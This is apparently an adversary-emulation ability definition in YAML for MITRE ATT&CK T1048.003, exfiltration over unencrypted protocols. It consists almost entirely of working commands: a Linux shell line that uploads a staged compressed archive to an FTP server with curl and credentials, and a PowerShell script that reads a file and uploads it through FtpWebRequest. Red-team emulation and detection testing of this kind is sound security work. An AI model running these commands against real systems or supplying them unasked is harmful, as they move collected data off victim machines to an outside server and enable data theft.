---

- id: d754878c-17dd-46dc-891c-a993f8a10336
  name: Exfil Compressed Archive to FTP Server
  description: This ability exfiltrates a compressed archive to an FTP server.
  tactic: exfiltration
  technique:
    attack_id: T1048.003
    name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
  platforms:
    linux:
      sh:
        command: |
          LocalFile='#{file.staged_at}';
          RemoteName="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
          curl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{custom.ftp_username}:'#{custom.ftp_password}'
    windows:
      psh:
        command: |
          $SourceFile = (Get-Item #{file.staged_at});
          $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";
          $ftp = [System.Net.FtpWebRequest]::Create("ftp://#{ftp.server.address}/$RemoteName");
          $ftp = [System.Net.FTPWebRequest]$ftp;
          $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
          $ftp.Credentials = New-Object System.Net.NetworkCredential("#{custom.ftp_username}", "#{custom.ftp_password}");
          $ftp.UseBinary = $true;
          $ftp.UsePassive = $true;

          $content = [System.IO.File]::ReadAllBytes("#{file.path}");
          $ftp.ContentLength = $content.Length;
          $requestStream = $ftp.GetRequestStream();
          $requestStream.Write($content, 0, $content.Length);

          $requestStream.Close();
          $requestStream.Dispose();
  requirements:
    - plugins.stockpile.app.requirements.paw_provenance:
        - source: file.staged_at
    - plugins.stockpile.app.requirements.basic:
      - source: file.staged_at
        edge: is_compressed